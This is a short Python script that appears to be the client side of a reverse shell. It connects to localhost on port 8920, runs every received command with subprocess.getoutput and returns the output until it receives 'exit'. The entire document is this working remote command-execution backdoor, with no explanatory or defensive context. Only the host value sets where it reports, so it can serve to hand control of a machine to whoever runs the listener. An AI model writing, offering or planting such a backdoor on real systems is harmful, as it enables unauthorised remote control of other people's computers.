import socket
import subprocess

slave = socket.socket()

host = "localhost"

port = 8920

slave.connect((host, port))

while True:

    command = slave.recv(1024).decode()
    print(command)

    if command == "exit":
        break

    output = "output:\n"

    output += subprocess.getoutput(command)

    slave.send(output.encode())

slave.close()